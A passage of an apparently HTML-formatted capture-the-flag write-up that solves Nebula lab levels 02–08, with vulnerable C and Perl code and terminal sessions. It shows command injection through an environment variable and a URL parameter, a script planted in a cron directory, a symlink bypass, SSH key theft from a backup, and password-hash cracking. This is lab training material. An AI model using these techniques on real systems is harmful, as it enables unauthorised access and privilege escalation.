&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer;&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;gid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;uid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid;&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getegid();&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;geteuid();&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresgid(gid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresuid(uid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt;

 &lt;span style=&#34;color: #f8f8f2&#34;&gt;asprintf(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/echo %s is cool&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;));&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;about to call system(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer);&lt;/span&gt;
  
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(buffer);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is very similar to &lt;em&gt;Level01&lt;/em&gt; but this time they seem to have patched the system call. However this time they&amp;rsquo;ve added something to the statement that we have control over. Look at line 22 and think about how we can make use of that.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level02@nebula:/home/flag02$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export USER&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;quot;&amp;quot;;getflag&amp;#39;&lt;/span&gt;
level02@nebula:/home/flag02$ ./flag02
about to call system(&amp;quot;/bin/echo &amp;quot;&amp;quot;;getflag is cool&amp;quot;)

You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id=&#34;level-03:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 03&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.&lt;/p&gt;

&lt;p&gt;There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So first things first let&amp;rsquo;s take a look at that crontab&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
	rm -f &amp;quot;$i&amp;quot;
done
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ok, so it will take a shell script in the &lt;code&gt;writeable.d&lt;/code&gt; directory, execute it and then delete it. Luckily the directory is world read/write, allowing us to add out own script. As the crontab will run the script as the &lt;code&gt;flag03&lt;/code&gt; user, we might as well just run the &lt;code&gt;getflag&lt;/code&gt; from it. We&amp;rsquo;ll capture some output to make sure it worked.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level03@nebula:/home/flag03$ cat writeable.d/getit
/bin/getflag &amp;gt; /tmp/gotit
# &lt;span style=&#34;color: #f8f8f2&#34;&gt;wait &lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; the script to run....
level03@nebula:/home/flag03$ cat /tmp/gotflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-04:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 04&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc;&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s [file to read]&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strstr(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;token&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You may not access &amp;#39;%s&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;O_RDONLY);&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(fd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(EXIT_FAILURE,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to open %s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;read(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf));&lt;/span&gt;
  
  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(rc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;err(EXIT_FAILURE,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to read fd %d&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;write(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ok, so let&amp;rsquo;s take a look at what happens when we run the file
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level04@nebula:/home/flag04$ ls
flag04  token
level04@nebula:/home/flag04$ ./flag04
./flag04 [file to read]
level04@nebula:/home/flag04$ ./flag04 token
You may not access &amp;#39;token&amp;#39;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So we can&amp;rsquo;t access token. Looking at the code there&amp;rsquo;s a check to see if the file is named &lt;code&gt;token&lt;/code&gt;. We can&amp;rsquo;t simply copy the &lt;em&gt;token&lt;/em&gt; file because it&amp;rsquo;s read only by the flag user. So there&amp;rsquo;s only one thing for it: symlinks&lt;/p&gt;

&lt;p&gt;Then get the flag (some ssh output cut for brevity)
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/myfile
level04@nebula:/home/flag04$ ./flag04 /tmp/myfile
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ ssh flag04@localhost

flag04@localhost&amp;#39;s password:

flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So the output of the command is a &lt;em&gt;token&lt;/em&gt; which is the term used for the password of the flag&amp;rsquo;s user. Using this to logon as &lt;em&gt;flag04&lt;/em&gt; and run &lt;code&gt;getflag&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;level-05:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 05&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ok, let&amp;rsquo;s do that
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level05@nebula:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; ~flag05
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     420 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;That &lt;em&gt;backup&lt;/em&gt; directory looks like our target&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level05@nebula:/home/flag05$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; .backup/
level05@nebula:/home/flag05/.backup$ ls -la
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ tar xvzf backup-19072011.tgz -C /tmp
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Right so let&amp;rsquo;s use these keys to login as &lt;em&gt;flag05&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level05@nebula:/home/flag05/.backup$ ssh -i /tmp/.ssh/id_rsa flag05@localhost

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-06:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 06&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To cut a long story short, the way the password is stored for this user is not the same as for the other users. In older *nix systems the password was stored inside the &lt;code&gt;/etc/passwd&lt;/code&gt; file. So let&amp;rsquo;s take a look:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level06@nebula:/home/flag06$ cat /etc/passwd &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Yep, there&amp;rsquo;s the encrypted password. Grab that line and run it through John The Ripper&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo &lt;/span&gt;flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh &amp;gt; nebula.txt
root@kali:~# john nebula.txt  -show
flag06:hello:993:993::/home/flag06:/bin/sh

1 password hash cracked, 0 left
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s that, now back on the nebula box&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level06@nebula:/home/flag06$ ssh flag06@localhost

flag06@localhost&amp;#39;s password: hello

getflag06@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-07:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 07&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;CGI&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;qw{param}&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Content-type: text/html\n\n&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;sub &lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;ping&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$host&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$_[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;@output&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;`ping -c 3 $host 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;foreach&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$line&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(@output)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;$line&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; 

  &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;# check if Host set. if not, display normal page, etc&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;ping(param(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Host&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So the Nebula machine has a webserver running. Checking the config file we can see that it&amp;rsquo;s running on port 7007. The script tells us that it&amp;rsquo;s expecting a &lt;code&gt;Host&lt;/code&gt; parameter. So let&amp;rsquo;s hit the server from our web browser at the following URL (your IP will depend on what IP your VM has) &lt;code&gt;http://192.168.56.102:7007/index.cgi?Host=192.168.56.102&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Basically I am pinging the same host. The webpage will display the output of the ping command.&lt;/p&gt;

&lt;p&gt;We can&amp;rsquo;t change the ping call, but we have control over what gets passed to the command. Let&amp;rsquo;s craft a special URL&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; curl http://192.168.56.102:7007/index.cgi?Host&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;127.0.0.1%20%26%26%20getflag
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.117 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.028 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.028/0.060/0.117/0.040 ms
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Notice we need to encode the URL parms. The plaintext URL is &lt;code&gt;http://192.168.56.102:7007/index.cgi?Host=127.0.0.1 &amp;amp;&amp;amp; getflag&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;level-08:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 08&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Let&amp;rsquo;s take a look then&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level08@nebula:/home/flag08$ ls -la
total 18
drwxr-x--- 1 flag08 level08   60 2014-06-14 14:10 .
drwxr-xr-x 1 root   root     500 2012-08-27 07:18 ..
-rw------- 1 flag08 flag08    13 2014-06-14 14:10 .bash_history
-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

